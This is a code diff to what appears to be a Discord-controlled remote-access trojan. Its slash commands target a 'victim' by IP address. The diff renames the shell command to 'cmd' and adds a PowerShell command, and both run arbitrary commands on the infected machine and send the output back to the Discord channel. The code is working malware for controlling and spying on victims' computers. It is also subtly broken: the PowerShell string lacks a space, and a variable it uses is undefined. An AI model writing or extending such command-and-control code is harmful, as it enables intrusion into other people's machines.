@@ -11,13 +11,13 @@ class Shell(commands.Cog):
         self.ip_addr = self.bot.ip_addr
         
     @commands.slash_command(
-        description="Executes shell commands",
+        description="Executes command prompt commands",
         options=[
             discord.Option("victim", description="IP Address of specific victim", required=True),
             discord.Option("command", description="The CMD command which will be executed", required=True),
         ]
     )
-    async def shell(self, ctx, victim, command): 
+    async def cmd(self, ctx, victim, command): 
         if str(victim) == str(self.ip_addr):
             await ctx.response.defer()
             
@@ -35,10 +35,46 @@ class Shell(commands.Cog):
                     f.write(output)
                 await ctx.followup.send(
                     f"Output for `{command}`:", 
-                    file = discord.File(
-                        "output.txt", 
-                        filename="output.txt"
-                    )
+                    file = discord.File( "output.txt" )
+                )
+                time.sleep(2)
+                os.remove("output.txt")
+                os.chdir(self.bot.original_dir)
+                return None
+                
+            embed = self.bot.genEmbed(
+                f"Output for `{command}`:",
+                datetime.now(),
+                f"```{output}```"
+            )
+            await ctx.followup.send(embed=embed)
+
+    @commands.slash_command(
+        description="Executes Powershell commands",
+        options=[
+            discord.Option("victim", description="IP Address of specific victim", required=True),
+            discord.Option("command", description="The PS command which will be executed", required=True),
+        ]
+    )
+    async def powershell(self, ctx, victim, command): 
+        if str(victim) == str(self.ip_addr):
+            await ctx.response.defer()
+            
+            output = subprocess.run(
+                "powershell.exe" + command, 
+                shell=True,
+                stdin=subprocess.PIPE, 
+                stderr=subprocess.PIPE,
+                stdout=subprocess.PIPE, 
+            ).stdout.decode('utf-8')
+            
+            if len(output) > 4095:
+                os.chdir(nr_working)
+                with open("output.txt", 'w+') as f:
+                    f.write(output)
+                await ctx.followup.send(
+                    f"Output for `{command}`:", 
+                    file = discord.File( "output.txt" )
                 )
                 time.sleep(2)
                 os.remove("output.txt")
